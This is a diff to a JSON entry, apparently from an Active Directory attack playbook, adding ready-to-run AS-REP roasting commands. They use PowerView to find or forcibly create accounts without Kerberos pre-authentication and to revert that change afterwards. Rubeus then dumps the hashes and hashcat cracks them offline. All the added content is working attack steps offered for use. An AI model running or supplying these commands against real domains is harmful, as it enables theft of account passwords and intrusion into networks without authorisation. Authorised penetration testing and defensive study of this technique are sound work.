@@ -80,5 +80,29 @@
   },
   "tools": [
     "PowerView"
+  ],
+  "variations": [
+    {
+      "label": "Targeted AS-REP (set the UAC flag if you have write)",
+      "command": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose"
+    },
+    {
+      "label": "Revert the flag after roasting",
+      "command": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Find accounts without pre-auth",
+      "command": "Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname"
+    },
+    {
+      "label": "Roast with Rubeus",
+      "command": ".\\Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap /outfile:asrep.txt"
+    },
+    {
+      "label": "Crack offline",
+      "command": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
+    }
   ]
 }
